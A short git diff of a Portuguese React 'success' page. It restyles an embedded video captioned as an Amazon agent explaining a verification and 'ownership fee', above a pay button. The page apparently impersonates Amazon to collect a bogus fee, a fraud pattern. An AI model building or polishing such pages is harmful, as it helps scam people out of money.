@@ -131,18 +131,20 @@ export default function Sucesso() {
             estornado e você recebe o comprovante diretamente no e-mail cadastrado.
           </p>
 
-          {/* 🎥 Vídeo explicativo */}
-          <div className="video-explicativo">
-            <video
-              src="/202509250138 (1).mp4"
-              controls
-              playsInline
-              className="video-container"
-            />
-            <p className="video-legenda">
-              Agente Amazon explicando o processo de verificação e taxa de titularidade.
-            </p>
-          </div>
+{/* 🎥 Vídeo explicativo */}
+<div className="video-explicativo">
+  <video
+    src="/202509250138 (1).mp4"
+    controls
+    playsInline
+    className="video-mobile"
+    poster="/IMG_4267.png" // opcional: thumbnail inicial, como na imagem
+  />
+  <p className="video-legenda2">
+    Agente Amazon explicando o processo de verificação e taxa de titularidade.
+  </p>
+</div>
+
 
           <button
             className="btn-pagar"
